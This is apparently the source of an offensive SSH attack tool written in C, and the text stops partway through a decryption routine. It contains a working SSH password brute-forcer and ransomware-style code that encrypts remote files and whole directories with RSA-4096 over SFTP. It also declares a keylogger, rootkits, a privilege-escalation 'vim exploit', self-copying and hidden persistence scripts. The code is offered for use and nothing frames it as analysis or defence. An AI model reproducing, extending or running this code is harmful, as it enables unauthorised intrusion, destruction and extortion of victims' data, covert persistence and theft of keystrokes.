#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libssh/libssh.h>
#include <libssh/callbacks.h>
#include <libssh/sftp.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <ctype.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <linux/input.h>
#include <pthread.h>
#include <math.h>
#include <stdint.h>
#include <unistd.h>
#include <limits.h>
#include <dirent.h>
#include <termios.h>
#include <errno.h>
#include <sys/select.h>

// ==================== Constants and Configuration ====================

#define RSA_KEY_SIZE 4096
#define BUFFER_SIZE 4096
#define MAX_PATH_LENGTH 4096

#define REPLICA_NAME ".sshd-helper"
#define PERSISTENCE_SCRIPT "/etc/init.d/.systemd-helper"
#define MARKER_FILE "/tmp/.ssh-helper-running"

// ==================== Type Definitions ====================

typedef struct {
    int running;
    char logfile[256];
    ssh_session session;
    pthread_t thread;
} keylogger_data_t;

typedef struct {
    RSA *public_key;
    RSA *private_key;
    char public_key_path[MAX_PATH_LENGTH];
    char private_key_path[MAX_PATH_LENGTH];
} rsa_keys_t;

// ==================== Global Variables ====================

static rsa_keys_t global_rsa_keys = {0};
static char *global_password = NULL;
static int password_loaded = 0;

// ==================== Function Declarations ====================

// Core SSH functions
int initialize_ssh_session(ssh_session *session, const char *target, const char *username, int port);
int authenticate_ssh_session(ssh_session session, const char *password_file);
int authenticate_ssh_session_auto(ssh_session session, const char *password_file);
void cleanup_ssh_session(ssh_session session);
int try_connection(const char *host, int port, const char *username, const char *password);
void brute_force_passwords(const char *host, int port, const char *username, const char *password_file);

// RSA operations
int initialize_rsa_keys(rsa_keys_t *keys);
void cleanup_rsa_keys(rsa_keys_t *keys);
int generate_rsa_key_pair(const char *public_key_file, const char *private_key_file);
RSA *load_public_key(const char *public_key_file);
RSA *load_private_key(const char *private_key_file);
int encrypt_file(const char *input_file, const char *output_file, RSA *rsa);
int decrypt_file(const char *input_file, const char *output_file, RSA *rsa);

// File operations
void upload_file(ssh_session session, const char *local_path, const char *remote_path);
int upload_file_data(ssh_session session, const void *data, size_t size, const char *remote_path);

// Remote encryption
void encrypt_remote_file(ssh_session session, const char *remote_file);
void decrypt_remote_file(ssh_session session, const char *remote_file);
void encrypt_remote_directory(ssh_session session, const char *remote_dir);
void decrypt_remote_directory(ssh_session session, const char *remote_dir);

// Keylogger functions
const char* generate_keylogger_binary();
int deploy_remote_keylogger(ssh_session session, const char *remote_logfile);
int stop_remote_keylogger_process(ssh_session session);
void start_remote_keylogger(keylogger_data_t *data, ssh_session session, const char *remote_logfile);
void stop_remote_keylogger(keylogger_data_t *data);
int download_keylogs(keylogger_data_t *data, const char *local_path);

// Rootkit functions
int create_and_compile_rootkit(ssh_session session);
int deploy_rootkit_with_vim(ssh_session session);
int cleanup_rootkit_files(ssh_session session);
int load_rootkit_via_exploit(ssh_session session, const char *rootkit_path);
int deploy_userland_rootkit(ssh_session session);
int load_rootkit_without_sudo(ssh_session session, const char *rootkit_path);

// VIM exploit functions
int execute_root_command_via_vim(ssh_session session, const char *command);
int execute_root_command_via_vim_v2(ssh_session session, const char *command);
int execute_vim_command_with_auto_password(ssh_session session, const char *vim_command);
int load_rootkit_via_vim_exploit_auto_password(ssh_session session, const char *rootkit_path);
int load_rootkit_via_vim_script_auto_password(ssh_session session, const char *rootkit_path);
int hide_module_with_vim_auto_password(ssh_session session);
int show_module_with_vim_auto_password(ssh_session session);
int hide_pid_with_vim_auto_password(ssh_session session, int pid);
int show_pid_with_vim_auto_password(ssh_session session, int pid);
int interactive_vim_root_shell_auto_password(ssh_session session);
int show_module_with_vim(ssh_session session);
int hide_pid_with_vim(ssh_session session, int pid);

// Password management
int load_password_from_file(const char *password_file);
void cleanup_password();

// Utility functions
int is_already_running(const char *marker_file);
void copy_self_to_remote(ssh_session session, const char *remote_path);
void setup_persistence(ssh_session session, const char *binary_path);
void hide_file_on_remote(ssh_session session, const char *remote_path);
void interactive_shell(ssh_session session);

// ==================== Core SSH Functions ====================

int initialize_ssh_session(ssh_session *session, const char *target, const char *username, int port) {
    *session = ssh_new();
    if (!*session) {
        fprintf(stderr, "Error creating SSH session\n");
        return -1;
    }

    ssh_options_set(*session, SSH_OPTIONS_HOST, target);
    ssh_options_set(*session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(*session, SSH_OPTIONS_USER, username);

    printf("[*] Connecting to %s:%d as %s...\n", target, port, username);
    if (ssh_connect(*session) != SSH_OK) {
        fprintf(stderr, "Error connecting to %s: %s\n", target, ssh_get_error(*session));
        ssh_free(*session);
        return -1;
    }
    
    printf("[+] Connected to %s\n", target);
    return 0;
}

int authenticate_ssh_session(ssh_session session, const char *password_file) {
    if (password_file) {
        FILE *pf = fopen(password_file, "r");
        if (!pf) {
            fprintf(stderr, "Can't open password file %s\n", password_file);
            return -1;
        }

        char password[256];
        int authenticated = 0;
        
        printf("[*] Starting password brute force from %s\n", password_file);
        while (fgets(password, sizeof(password), pf)) {
            password[strcspn(password, "\n")] = 0;
            
            printf("[*] Trying password: %s\n", password);
            if (ssh_userauth_password(session, NULL, password) == SSH_AUTH_SUCCESS) {
                printf("[+] Authenticated with password: %s\n", password);
                authenticated = 1;
                break;
            }
        }
        
        fclose(pf);
        
        if (!authenticated) {
            fprintf(stderr, "[-] Failed to authenticate with any password\n");
            return -1;
        }
    } else {
        printf("[*] Attempting authentication...\n");
        if (ssh_userauth_publickey_auto(session, NULL, NULL) == SSH_AUTH_SUCCESS) {
            printf("[+] Authenticated with public key\n");
        } else {
            char *password = getpass("Password: ");
            if (ssh_userauth_password(session, NULL, password) != SSH_AUTH_SUCCESS) {
                fprintf(stderr, "[-] Authentication failed\n");
                memset(password, 0, strlen(password));
                return -1;
            }
            printf("[+] Authenticated with password\n");
            memset(password, 0, strlen(password));
        }
    }
    return 0;
}

void cleanup_ssh_session(ssh_session session) {
    if (session) {
        ssh_disconnect(session);
        ssh_free(session);
    }
}

int try_connection(const char *host, int port, const char *username, const char *password) {
    ssh_session session;
    int rc;
    int connected = 0;

    session = ssh_new();
    if (session == NULL) {
        fprintf(stderr, "Error creating SSH session\n");
        return 0;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    ssh_options_set(session, SSH_OPTIONS_STRICTHOSTKEYCHECK, "no");

    rc = ssh_connect(session);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error connecting to %s:%d: %s\n", host, port, ssh_get_error(session));
        ssh_free(session);
        return 0;
    }

    rc = ssh_userauth_password(session, NULL, password);
    if (rc == SSH_AUTH_SUCCESS) {
        printf("✅ SUCCESS! Authentication successful with password: %s\n", password);
        connected = 1;
    } else if (rc == SSH_AUTH_DENIED) {
        printf("❌ Authentication denied for password: %s\n", password);
    } else if (rc == SSH_AUTH_PARTIAL) {
        printf("⚠️  Partial authentication for password: %s\n", password);
    } else {
        printf("❌ Authentication error for password: %s: %s\n", password, ssh_get_error(session));
    }

    ssh_disconnect(session);
    ssh_free(session);

    return connected;
}

void brute_force_passwords(const char *host, int port, const char *username, const char *password_file) {
    FILE *file = fopen(password_file, "r");
    if (!file) {
        perror("Failed to open password file");
        return;
    }

    char password[256];
    int attempts = 0;
    int max_attempts = 5000;
    int valid_passwords = 0;
    int total_passwords = 0;

    printf("[+] Password loaded from file: %s\n", password_file);
    printf("[*] Starting authentication...\n");
    printf("[*] Trying password authentication...\n");

    while (fgets(password, sizeof(password), file)) {
        password[strcspn(password, "\r\n")] = '\0';
        if (strlen(password) > 0) {
            total_passwords++;
        }
    }

    rewind(file);

    while (fgets(password, sizeof(password), file) && attempts < max_attempts) {
        password[strcspn(password, "\r\n")] = '\0';
        if (strlen(password) == 0) {
            continue;
        }

        attempts++;
        
        if (try_connection(host, port, username, password)) {
            valid_passwords++;
        }
        
        usleep(100000);
    }

    fclose(file);

    if (valid_passwords == 0) {
        printf("[-] Password authentication failed\n");
    } else {
        printf("[+] Found %d valid password(s)\n", valid_passwords);
    }
}

// ==================== RSA Operations ====================

int initialize_rsa_keys(rsa_keys_t *keys) {
    if (keys->public_key && keys->private_key) {
        return 1;
    }

    if (keys->public_key_path[0] == '\0') {
        snprintf(keys->public_key_path, sizeof(keys->public_key_path), 
                "/tmp/global_rsa_pub_%d.pem", (int)getpid());
    }
    
    if (keys->private_key_path[0] == '\0') {
        snprintf(keys->private_key_path, sizeof(keys->private_key_path), 
                "/tmp/global_rsa_priv_%d.pem", (int)getpid());
    }
    
    printf("[*] Generating global RSA-%d key pair...\n", RSA_KEY_SIZE);
    if (!generate_rsa_key_pair(keys->public_key_path, keys->private_key_path)) {
        fprintf(stderr, "Failed to generate global RSA key pair\n");
        return 0;
    }
    
    keys->public_key = load_public_key(keys->public_key_path);
    keys->private_key = load_private_key(keys->private_key_path);
    
    if (!keys->public_key || !keys->private_key) {
        fprintf(stderr, "Failed to load global RSA keys\n");
        if (keys->public_key) RSA_free(keys->public_key);
        if (keys->private_key) RSA_free(keys->private_key);
        keys->public_key = NULL;
        keys->private_key = NULL;
        return 0;
    }
    
    printf("[+] Global RSA-%d key pair initialized\n", RSA_KEY_SIZE);
    return 1;
}

void cleanup_rsa_keys(rsa_keys_t *keys) {
    if (keys->public_key) {
        RSA_free(keys->public_key);
        keys->public_key = NULL;
    }
    
    if (keys->private_key) {
        RSA_free(keys->private_key);
        keys->private_key = NULL;
    }
    
    if (keys->public_key_path[0] != '\0') {
        unlink(keys->public_key_path);
        keys->public_key_path[0] = '\0';
    }
    
    if (keys->private_key_path[0] != '\0') {
        unlink(keys->private_key_path);
        keys->private_key_path[0] = '\0';
    }
}

int generate_rsa_key_pair(const char *public_key_file, const char *private_key_file) {
    RSA *rsa = NULL;
    BIGNUM *bn = NULL;
    FILE *pub_fp = NULL, *priv_fp = NULL;
    int ret = 0;

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    bn = BN_new();
    if (!bn || !BN_set_word(bn, RSA_F4)) {
        fprintf(stderr, "Error setting RSA exponent\n");
        goto cleanup;
    }

    printf("Generating %d-bit RSA key pair...\n", RSA_KEY_SIZE);
    rsa = RSA_new();
    if (!rsa || !RSA_generate_key_ex(rsa, RSA_KEY_SIZE, bn, NULL)) {
        fprintf(stderr, "Error generating RSA key pair\n");
        goto cleanup;
    }

    pub_fp = fopen(public_key_file, "w");
    if (!pub_fp) {
        fprintf(stderr, "Error opening public key file for writing\n");
        goto cleanup;
    }
    if (!PEM_write_RSAPublicKey(pub_fp, rsa)) {
        fprintf(stderr, "Error writing public key\n");
        goto cleanup;
    }

    priv_fp = fopen(private_key_file, "w");
    if (!priv_fp) {
        fprintf(stderr, "Error opening private key file for writing\n");
        goto cleanup;
    }
    if (!PEM_write_RSAPrivateKey(priv_fp, rsa, NULL, NULL, 0, NULL, NULL)) {
        fprintf(stderr, "Error writing private key\n");
        goto cleanup;
    }

    printf("RSA key pair generated successfully.\n");
    ret = 1;

cleanup:
    if (pub_fp) fclose(pub_fp);
    if (priv_fp) fclose(priv_fp);
    if (rsa) RSA_free(rsa);
    if (bn) BN_free(bn);
    EVP_cleanup();
    ERR_free_strings();
    return ret;
}

RSA *load_public_key(const char *public_key_file) {
    FILE *fp = fopen(public_key_file, "r");
    if (!fp) {
        fprintf(stderr, "Error opening public key file\n");
        return NULL;
    }

    RSA *rsa = PEM_read_RSAPublicKey(fp, NULL, NULL, NULL);
    fclose(fp);
    
    if (!rsa) {
        fprintf(stderr, "Error reading public key\n");
        ERR_print_errors_fp(stderr);
    }
    
    return rsa;
}

RSA *load_private_key(const char *private_key_file) {
    FILE *fp = fopen(private_key_file, "r");
    if (!fp) {
        fprintf(stderr, "Error opening private key file\n");
        return NULL;
    }

    RSA *rsa = PEM_read_RSAPrivateKey(fp, NULL, NULL, NULL);
    fclose(fp);
    
    if (!rsa) {
        fprintf(stderr, "Error reading private key\n");
        ERR_print_errors_fp(stderr);
    }
    
    return rsa;
}

int encrypt_file(const char *input_file, const char *output_file, RSA *rsa) {
    FILE *in_fp = NULL, *out_fp = NULL;
    unsigned char *buffer = NULL;
    unsigned char *encrypted = NULL;
    int buffer_len, encrypted_len;
    int ret = 0;
    int rsa_size = RSA_size(rsa);
    int max_data_len = rsa_size - 42;

    in_fp = fopen(input_file, "rb");
    if (!in_fp) {
        fprintf(stderr, "Error opening input file: %s\n", input_file);
        goto cleanup;
    }

    out_fp = fopen(output_file, "wb");
    if (!out_fp) {
        fprintf(stderr, "Error opening output file: %s\n", output_file);
        goto cleanup;
    }

    buffer = (unsigned char *)malloc(max_data_len);
    encrypted = (unsigned char *)malloc(rsa_size);
    if (!buffer || !encrypted) {
        fprintf(stderr, "Memory allocation error\n");
        goto cleanup;
    }

    while ((buffer_len = fread(buffer, 1, max_data_len, in_fp)) > 0) {
        encrypted_len = RSA_public_encrypt(buffer_len, buffer, encrypted, rsa, RSA_PKCS1_OAEP_PADDING);
        if (encrypted_len == -1) {
            fprintf(stderr, "Encryption error\n");
            ERR_print_errors_fp(stderr);
            goto cleanup;
        }

        if (fwrite(encrypted, 1, encrypted_len, out_fp) != encrypted_len) {
            fprintf(stderr, "Error writing to output file\n");
            goto cleanup;
        }
    }

    ret = 1;

cleanup:
    if (in_fp) fclose(in_fp);
    if (out_fp) fclose(out_fp);
    if (buffer) free(buffer);
    if (encrypted) free(encrypted);
    return ret;
}

int decrypt_file(const char *input_file, const char *output_file, RSA *rsa) {
    FILE *in_fp = NULL, *out_fp = NULL;
    unsigned char *buffer = NULL;
    unsigned char *decrypted = NULL;
    int buffer_len, decrypted_len;
    int ret = 0;
    int rsa_size = RSA_size(rsa);

    in_fp = fopen(input_file, "rb");
    if (!in_fp) {
        fprintf(stderr, "Error opening input file: %s\n", input_file);
        goto cleanup;
    }

    out_fp = fopen(output_file, "wb");
    if (!out_fp) {
        fprintf(stderr, "Error opening output file: %s\n", output_file);
        goto cleanup;
    }

    buffer = (unsigned char *)malloc(rsa_size);
    decrypted = (unsigned char *)malloc(rsa_size);
    if (!buffer || !decrypted) {
        fprintf(stderr, "Memory allocation error\n");
        goto cleanup;
    }

    while ((buffer_len = fread(buffer, 1, rsa_size, in_fp)) > 0) {
        if (buffer_len != rsa_size) {
            fprintf(stderr, "Invalid encrypted data size\n");
            goto cleanup;
        }

        decrypted_len = RSA_private_decrypt(buffer_len, buffer, decrypted, rsa, RSA_PKCS1_OAEP_PADDING);
        if (decrypted_len == -1) {
            fprintf(stderr, "Decryption error\n");
            ERR_print_errors_fp(stderr);
            goto cleanup;
        }

        if (fwrite(decrypted, 1, decrypted_len, out_fp) != decrypted_len) {
            fprintf(stderr, "Error writing to output file\n");
            goto cleanup;
        }
    }

    ret = 1;

cleanup:
    if (in_fp) fclose(in_fp);
    if (out_fp) fclose(out_fp);
    if (buffer) free(buffer);
    if (decrypted) free(decrypted);
    return ret;
}

// ==================== File Operations ====================

void upload_file(ssh_session session, const char *local_path, const char *remote_path) {
    FILE *file = fopen(local_path, "rb");
    if (!file) {
        perror("Failed to open local file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *buffer = malloc(size);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(file);
        return;
    }

    if (fread(buffer, 1, size, file) != size) {
        perror("Failed to read file");
        free(buffer);
        fclose(file);
        return;
    }
    fclose(file);

    if (upload_file_data(session, buffer, size, remote_path) != 0) {
        fprintf(stderr, "Failed to upload file\n");
    }

    free(buffer);
}

int upload_file_data(ssh_session session, const void *data, size_t size, const char *remote_path) {
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return -1;
    }

    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return -1;
    }

    sftp_file file = sftp_open(sftp, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (!file) {
        fprintf(stderr, "Can't open remote file: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return -1;
    }

    size_t written = 0;
    while (written < size) {
        size_t chunk = (size - written) > 32768 ? 32768 : (size - written);
        int nwritten = sftp_write(file, (const char *)data + written, chunk);
        if (nwritten < 0) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
            sftp_close(file);
            sftp_free(sftp);
            return -1;
        }
        written += nwritten;
    }

    sftp_close(file);
    sftp_free(sftp);
    return 0;
}

// ==================== Remote Encryption Functions ====================

void encrypt_remote_file(ssh_session session, const char *remote_file) {
    printf("[+] Encrypting remote file with RSA-4096: %s\n", remote_file);
    
    if (!initialize_rsa_keys(&global_rsa_keys)) {
        fprintf(stderr, "Failed to initialize RSA keys\n");
        return;
    }
    
    char temp_file[1024];
    snprintf(temp_file, sizeof(temp_file), "%s.tmp", remote_file);
    char encrypted_file[1024];
    snprintf(encrypted_file, sizeof(encrypted_file), "%s.encrypted", remote_file);
    
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return;
    }
    
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }
    
    sftp_file remote_src = sftp_open(sftp, remote_file, O_RDONLY, 0);
    if (!remote_src) {
        fprintf(stderr, "Cannot open remote file for reading: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }
    
    FILE *local_temp = fopen(temp_file, "wb");
    if (!local_temp) {
        fprintf(stderr, "Cannot open local temporary file: %s\n", strerror(errno));
        sftp_close(remote_src);
        sftp_free(sftp);
        return;
    }
    
    char buffer[BUFFER_SIZE];
    ssize_t nbytes;
    while ((nbytes = sftp_read(remote_src, buffer, sizeof(buffer))) > 0) {
        if (fwrite(buffer, 1, nbytes, local_temp) != nbytes) {
            fprintf(stderr, "Error writing to local temporary file\n");
            fclose(local_temp);
            sftp_close(remote_src);
            sftp_free(sftp);
            unlink(temp_file);
            return;
        }
    }
    
    fclose(local_temp);
    sftp_close(remote_src);
    
    if (!encrypt_file(temp_file, encrypted_file, global_rsa_keys.public_key)) {
        fprintf(stderr, "Error encrypting file\n");
        sftp_free(sftp);
        unlink(temp_file);
        unlink(encrypted_file);
        return;
    }
    
    FILE *encrypted_src = fopen(encrypted_file, "rb");
    if (!encrypted_src) {
        fprintf(stderr, "Cannot open encrypted file: %s\n", strerror(errno));
        sftp_free(sftp);
        unlink(temp_file);
        unlink(encrypted_file);
        return;
    }
    
    sftp_file remote_dst = sftp_open(sftp, remote_file, O_WRONLY | O_TRUNC, 0644);
    if (!remote_dst) {
        fprintf(stderr, "Cannot open remote file for writing: %s\n", ssh_get_error(session));
        fclose(encrypted_src);
        sftp_free(sftp);
        unlink(temp_file);
        unlink(encrypted_file);
        return;
    }
    
    while ((nbytes = fread(buffer, 1, sizeof(buffer), encrypted_src)) > 0) {
        if (sftp_write(remote_dst, buffer, nbytes) != nbytes) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
            fclose(encrypted_src);
            sftp_close(remote_dst);
            sftp_free(sftp);
            unlink(temp_file);
            unlink(encrypted_file);
            return;
        }
    }
    
    fclose(encrypted_src);
    sftp_close(remote_dst);
    
    const char *remote_key_path = "/tmp/.rsa_key.pem";
    FILE *key_file = fopen(global_rsa_keys.private_key_path, "rb");
    if (key_file) {
        fseek(key_file, 0, SEEK_END);
        long key_size = ftell(key_file);
        fseek(key_file, 0, SEEK_SET);
        
        char *key_data = malloc(key_size);
        if (key_data) {
            if (fread(key_data, 1, key_size, key_file) == key_size) {
                sftp_file remote_key = sftp_open(sftp, remote_key_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
                if (remote_key) {
                    sftp_write(remote_key, key_data, key_size);
                    sftp_close(remote_key);
                }
            }
            free(key_data);
        }
        fclose(key_file);
    }
    
    sftp_free(sftp);
    unlink(temp_file);
    unlink(encrypted_file);
    
    printf("[+] File encrypted successfully with RSA-4096: %s\n", remote_file);
    printf("[+] Decryption key saved to: %s\n", remote_key_path);
}

void decrypt_remote_file(ssh_session session, const char *remote_file) {
    printf("[+] Decrypting remote file with RSA-4096: %s\n", remote_file);
    
    const char *remote_key_path = "/tmp/.rsa_key.pem";
    const char *local_key_path = "/tmp/remote_rsa_key.pem";
    
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return;
    }
    
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }
    
    sftp_file remote_key = sftp_open(sftp, remote_key_path, O_RDONLY, 0);
    if (!remote_key) {
        fprintf(stderr, "Cannot open remote key file: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }
    
    FILE *local_key = fopen(local_key_path, "wb");
    if (!local_key) {
        fprintf(stderr, "Cannot open local key file: %s\n", strerror(errno));
        sftp_close(remote_key);
        sftp_free(sftp);
        return;
    }
    
    char buffer[BUFFER_SIZE];
    ssize_t nbytes;
    while ((nbytes = sftp_read(remote_key, buffer, sizeof(buffer))) > 0) {
        if (fwrite(buffer, 1, nbytes, local_key) != nbytes) {
            fprintf(stderr, "Error writing to local key file\n");
            fclose(local_key);
            sftp_close(remote_key);
            sftp_free(sftp);
            unlink(local_key_path);
            return;
        }
    }
    
    fclose(local_key);
    sftp_close(remote_key);
    
    RSA *rsa = load_private_key(local_key_path);
    if (!rsa) {
        fprintf(stderr, "Failed to load RSA private key\n");
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }
    
    char temp_file[1024];
    snprintf(temp_file, sizeof(temp_file), "%s.tmp", remote_file);
    char decrypted_file[1024];
    snprintf(decrypted_file, sizeof(decrypted_file), "%s.decrypted", remote_file);
    
    sftp_file remote_src = sftp_open(sftp, remote_file, O_RDONLY, 0);
    if (!remote_src) {
        fprintf(stderr, "Cannot open remote file for reading: %s\n", ssh_get_error(session));
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }
    
    FILE *local_temp = fopen(temp_file, "wb");
    if (!local_temp) {
        fprintf(stderr, "Cannot open local temporary file: %s\n", strerror(errno));
        sftp_close(remote_src);
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }
    
    while ((nbytes = sftp_read(remote_src, buffer, sizeof(buffer))) > 0) {
        if (fwrite(buffer, 1, nbytes, local_temp) != nbytes) {
            fprintf(stderr, "Error writing to local temporary file\n");
            fclose(local_temp);
            sftp_close(remote_src);
            RSA_free(rsa);
            sftp_free(sftp);
            unlink(temp_file);
            unlink(local_key_path);
            return;
        }
    }
    
    fclose(local_temp);
    sftp_close(remote_src);
    
    if (!decrypt_file(temp_file, decrypted_file, rsa)) {
        fprintf(stderr, "Error decrypting file\n");
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(temp_file);
        unlink(decrypted_file);
        unlink(local_key_path);
        return;
    }
    
    FILE *decrypted_src = fopen(decrypted_file, "rb");
    if (!decrypted_src) {
        fprintf(stderr, "Cannot open decrypted file: %s\n", strerror(errno));
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(temp_file);
        unlink(decrypted_file);
        unlink(local_key_path);
        return;
    }
    
    sftp_file remote_dst = sftp_open(sftp, remote_file, O_WRONLY | O_TRUNC, 0644);
    if (!remote_dst) {
        fprintf(stderr, "Cannot open remote file for writing: %s\n", ssh_get_error(session));
        fclose(decrypted_src);
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(temp_file);
        unlink(decrypted_file);
        unlink(local_key_path);
        return;
    }
    
    while ((nbytes = fread(buffer, 1, sizeof(buffer), decrypted_src)) > 0) {
        if (sftp_write(remote_dst, buffer, nbytes) != nbytes) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
            fclose(decrypted_src);
            sftp_close(remote_dst);
            RSA_free(rsa);
            sftp_free(sftp);
            unlink(temp_file);
            unlink(decrypted_file);
            unlink(local_key_path);
            return;
        }
    }
    
    fclose(decrypted_src);
    sftp_close(remote_dst);
    
    RSA_free(rsa);
    sftp_free(sftp);
    unlink(temp_file);
    unlink(decrypted_file);
    unlink(local_key_path);
    
    printf("[+] File decrypted successfully with RSA-4096: %s\n", remote_file);
}

void encrypt_remote_directory(ssh_session session, const char *remote_dir) {
    printf("[+] Encrypting files in remote directory with RSA-4096: %s\n", remote_dir);
    
    if (!initialize_rsa_keys(&global_rsa_keys)) {
        fprintf(stderr, "Failed to initialize RSA keys\n");
        return;
    }
    
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return;
    }
    
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }
    
    sftp_dir dir = sftp_opendir(sftp, remote_dir);
    if (!dir) {
        fprintf(stderr, "Cannot open remote directory: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }
    
    sftp_attributes attr;
    while ((attr = sftp_readdir(sftp, dir)) != NULL) {
        if (strcmp(attr->name, ".") == 0 || strcmp(attr->name, "..") == 0) {
            sftp_attributes_free(attr);
            continue;
        }
        
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", remote_dir, attr->name);
        
        if (attr->type == SSH_FILEXFER_TYPE_DIRECTORY) {
            sftp_attributes_free(attr);
            encrypt_remote_directory(session, full_path);
            continue;
        }
        
        if (attr->type == SSH_FILEXFER_TYPE_REGULAR) {
            printf("[+] Encrypting file with RSA-4096: %s\n", full_path);
            
            char temp_file[1024];
            snprintf(temp_file, sizeof(temp_file), "/tmp/%s.tmp", attr->name);
            char encrypted_file[1024];
            snprintf(encrypted_file, sizeof(encrypted_file), "/tmp/%s.encrypted", attr->name);
            
            sftp_file remote_src = sftp_open(sftp, full_path, O_RDONLY, 0);
            if (!remote_src) {
                fprintf(stderr, "Cannot open remote file for reading: %s\n", ssh_get_error(session));
                sftp_attributes_free(attr);
                continue;
            }
            
            FILE *local_temp = fopen(temp_file, "wb");
            if (!local_temp) {
                fprintf(stderr, "Cannot open local temporary file: %s\n", strerror(errno));
                sftp_close(remote_src);
                sftp_attributes_free(attr);
                continue;
            }
            
            char buffer[BUFFER_SIZE];
            ssize_t nbytes;
            while ((nbytes = sftp_read(remote_src, buffer, sizeof(buffer))) > 0) {
                if (fwrite(buffer, 1, nbytes, local_temp) != nbytes) {
                    fprintf(stderr, "Error writing to local temporary file\n");
                    fclose(local_temp);
                    sftp_close(remote_src);
                    sftp_attributes_free(attr);
                    unlink(temp_file);
                    continue;
                }
            }
            
            fclose(local_temp);
            sftp_close(remote_src);
            
            if (!encrypt_file(temp_file, encrypted_file, global_rsa_keys.public_key)) {
                fprintf(stderr, "Error encrypting file\n");
                sftp_attributes_free(attr);
                unlink(temp_file);
                continue;
            }
            
            FILE *encrypted_src = fopen(encrypted_file, "rb");
            if (!encrypted_src) {
                fprintf(stderr, "Cannot open encrypted file: %s\n", strerror(errno));
                sftp_attributes_free(attr);
                unlink(temp_file);
                unlink(encrypted_file);
                continue;
            }
            
            sftp_file remote_dst = sftp_open(sftp, full_path, O_WRONLY | O_TRUNC, 0644);
            if (!remote_dst) {
                fprintf(stderr, "Cannot open remote file for writing: %s\n", ssh_get_error(session));
                fclose(encrypted_src);
                sftp_attributes_free(attr);
                unlink(temp_file);
                unlink(encrypted_file);
                continue;
            }
            
            while ((nbytes = fread(buffer, 1, sizeof(buffer), encrypted_src)) > 0) {
                if (sftp_write(remote_dst, buffer, nbytes) != nbytes) {
                    fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
                    fclose(encrypted_src);
                    sftp_close(remote_dst);
                    sftp_attributes_free(attr);
                    unlink(temp_file);
                    unlink(encrypted_file);
                    continue;
                }
            }
            
            fclose(encrypted_src);
            sftp_close(remote_dst);
            
            unlink(temp_file);
            unlink(encrypted_file);
        }
        
        sftp_attributes_free(attr);
    }
    
    sftp_closedir(dir);
    
    const char *remote_key_path = "/tmp/.rsa_dir_key.pem";
    upload_file(session, global_rsa_keys.private_key_path, remote_key_path);
    
    sftp_free(sftp);
    
    printf("[+] Directory encryption completed with RSA-4096: %s\n", remote_dir);
    printf("[+] Decryption key saved to: %s\n", remote_key_path);
}

void decrypt_remote_directory(ssh_session session, const char *remote_dir) {
    printf("[+] Decrypting files in remote directory with RSA-4096: %s\n", remote_dir);
    
    const char *remote_key_path = "/tmp/.rsa_dir_key.pem";
    const char *local_key_path = "/tmp/remote_rsa_dir_key.pem";
    
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return;
    }
    
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }
    
    sftp_file remote_key = sftp_open(sftp, remote_key_path, O_RDONLY, 0);
    if (!remote_key) {
        fprintf(stderr, "Cannot open remote key file: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }
    
    FILE *local_key = fopen(local_key_path, "wb");
    if (!local_key) {
        fprintf(stderr, "Cannot open local key file: %s\n", strerror(errno));
        sftp_close(remote_key);
        sftp_free(sftp);
        return;
    }
    
    char buffer[BUFFER_SIZE];
    ssize_t nbytes;
